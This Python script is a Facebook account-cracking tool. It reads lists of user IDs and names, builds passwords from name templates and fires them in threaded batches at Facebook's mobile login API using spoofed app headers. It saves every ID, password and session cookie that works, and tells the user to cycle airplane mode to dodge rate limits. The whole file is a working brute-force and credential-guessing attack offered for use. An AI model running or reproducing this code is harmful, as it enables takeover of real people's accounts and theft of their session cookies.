#Original written By Parvez Ahmed
import os,zlib
from os import system as osRUB
from os import system as cmd
os.system('clear')
print('\033[92;1m~ \033[1;37m Installing missing modules ...')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
try:
    import requests 
except ImportError:
    print('\n\033[92;1m~ \033[1;37m  installing Requests ...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n\033[92;1m~ \033[1;37m  installing futures ...\n')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as RPssb
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
#_____m1_____
def LOL1():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END ='[FBAN/FB4A;FBAV/386.0.0.88;FBBV/6664580;[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/6686554;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Telstra Mobile;FBMF/Nokia 5.4;FBBD/Nokia 5.4;FBPN/com.facebook.katana;FBDV/Nokia 5.4;FBSV/4.4.2;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#______m2_______
def LOL2():
    END = '[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/233265092;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#_______m3________
def LOL3():
    END = '[FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/233040754;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N975U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
    
#------------------------------------------------------------------------------------------------------#
sys.stdout.write('\x1b]2; RP\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
try:os.mkdir('/sdcard/RP')
except:pass
logo ="""\033[1;37m
  \033[38;5;46mAAA     GGGG  UU   UU NN   NN 
 \033[38;5;47mAAAAA   GG  GG UU   UU NNN  NN 
\033[38;5;48mAA   AA GG      UU   UU NN N NN 
\033[38;5;50mAAAAAAA GG   GG UU   UU NN  NNN 
\033[38;5;51mAA   AA  GGGGGG  UUUUU  NN   NN \033[1;32mR \033[1;33mO \033[1;34mU \033[1;35mF
\033[1;34m--------------------------------------------------------
\033[1;37m[\033[1;31m•\033[1;37m]\033[1;31m  DEVELOPER    :   \033[1;31mABDUR ROUF
\033[1;37m[\033[1;32m•\033[1;37m]\033[1;32m  TOOLS        :   \033[1;32mFILE CLONE
\033[1;37m[\033[1;33m•\033[1;37m]\033[1;33m  VERSION      :   \033[1;33m0.2
\033[1;37m[\033[1;34m•\033[1;37m]\033[1;34m  WORKING      :   \033[1;34mDATA
\033[1;37m[\033[1;35m•\033[1;37m]\033[1;35m  WHATSAPP     :   \033[1;35m8801317894742
\033[1;34m------------------------------------------------------"""
def linex():
        print(f"\033[1;34m-------------------------------------------------------""")
def clear():
    os.system("clear")
    print(logo)    
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        linex()
        print('\033[92;1m~\033[1;37m The Process has been Complete')
        linex()
        print('\033[92;1m~\033[1;37m TOTAL OK:\033[92;1m %s' % str(len(oks)))
        print('\033[92;1m~\033[1;37m TOTAL CP:\033[92;1m %s' % str(len(cps)))
        linex()
        input("Press enter to back RP Menu ")
        exit()
#──────────────────────────────────────────────#
def RP():   
    os.system('clear')
    print(logo)
    print(f'\033[92;1m[\033[1;37m1\033[92;1m] \033[1;32mFile Crack')
    print(f'\033[92;1m[\033[1;37mE\033[92;1m] \033[1;31mexit ')
    linex()
    select = input('\033[92;1m~\033[1;37m Choice :\033[92;1m ')
    if select =='1':
        method_crack()
 



    elif select =='2':
        os.system('RPg-open https://www.facebook.com/groups/344131704494239/')
        pass
    elif select =='3':
        os.system('RPg-open https://www.facebook.com/RP.RP/')
    else:
        print('\n\033[1;91m Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
def method_crack():
    global methods
    clear()
    print(f'\033[92;1m[\033[1;37m1\033[92;1m] \033[1;37mMethod')
    print(f'\033[92;1m[\033[1;37m2\033[92;1m] \033[1;37mMethod')
    print(f'\033[92;1m[\033[1;37m3\033[92;1m] \033[1;37mMethod')
    print(f'\033[92;1m[\033[1;37m0\033[92;1m] \033[91;1mBack')
    linex()
    option = input('\033[92;1m~\033[1;37m Choice :\033[92;1m ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
    elif option =='0':
        RP()
    else:
      print('\n\033[91;1mSelect Valid Option ...')
      time.sleep(2)
      method_crack()

class main_crack():
    def _init_(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print('\033[92;1m~ \033[1;37mPut file example:\033[92;1m /sdcard/File.txt  etc..')
        linex()
        self.file = input('\033[92;1m~ \033[1;37mPut file path:\033[92;1m ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('\033[91\;1m File location not found ')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('\033[92;1m~ \033[1;37mTry Again')
            time.sleep(2)
            main_crack().crack(id)
#____________________________m1______________________________________
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r \033[1;32mCracking.. \x1b[1;94m[{loop}] \033[1;32mOK \033[1;37m~\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m~\033[1;91m {len(cps)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': LOL1(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r\033[1;32m [AGUN]-[OK] {sid} | {ps} {S}")
                    print("\r\r\033[1;34m[💥\033[1;34m]\033[1;32m :\033[1;37m "+cookie)
                    linex()
                    oks.append(sid)
                    open('/sdcard/AGUN/OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AGUN/iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\033[91;1m [AGUN]-[CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/AGUN/CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#______________________________m3_____________________________________
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r \033[1;32mCracking.. \x1b[1;94m[{loop}] \033[1;32mOK \033[1;37m~\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m~\033[1;91m {len(cps)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': LOL2(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r\033[1;32m [AGUN]-[OK] {sid} | {ps} {S}")
                    print("\r\r\033[1;34m[💥\033[1;34m]\033[1;32m :\033[1;37m "+cookie)
                    linex()
                    oks.append(sid)
                    open('/sdcard/AGUN/OK-M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AGUN/iDs-COOKiEs-M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r\033[91;1m [AGUN]-[CP] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/AGUN/CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
#_________________________m2__________________________
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r \033[1;32mCracking.. \x1b[1;94m[{loop}] \033[1;32mOK \033[1;37m~\033[1;32m {len(oks)} \033[1;91mCP \033[1;37m~\033[1;91m {len(cps)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': LOL3(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r\033[1;32m [AGUN]-[OK] {sid} | {ps} {S}")
                    print("\r\r\033[1;34m[??\033[1;34m]\033[1;32m :\033[1;37m "+cookie)
                    oks.append(sid)
                    open('/sdcard/AGUN/OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AGUN/iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r\033[91;1m [AGUN]-[CP] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/AGUN/CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)
#_________________________________________________________________________________
    def pasw(self):       
            pw = []
            clear()
            print('\033[92;1m~ \033[1;37mPut limit between 1 \033[92;1m~\033[1;37m 30')
            linex()
            sl = int(input('\033[92;1m~ \033[1;37mHow many passwords do you want to add \033[91;1m?\033[92;1m '))
            os.system("clear")
            print(logo)
            print(f'\033[92;1m~ \033[1;37mEXAMPLE :\033[92;1mfirst last,first123,First@123…\033[1;37mEtc')
            linex()
            if sl =='':
                print('\n\033[92;1m~ \033[1;37Put limit 1 to 30')
            elif sl > 100:
                print('\n\033[91\;1mPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\033[92;1m~ \033[1;37m password {sr+1}:\033[92;1m '))
                    print(f"\33[1;37m-------------------------------------------------------""")
            os.system("clear")
            print(logo)
            
            print(f'\033[92;1m~ \033[1;37m Cracking Started')
            linex()
            print(f'\033[92;1m~ \033[1;37m Total IDs :\033[92;1m %s ' % len(self.id))
            print(f"\r\033[92;1m~ \33[1;97m Every 5 Min Turn on airplane mode\x1b[91;1m > On/Off\33[1;37m")
            linex()
            with RPssb(max_workers=30) as ssbworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                ssbworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ssbworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ssbworld.submit(self.methodC, uid, name, pwx)
                   except:pass
            result(oks,cps)   
RP()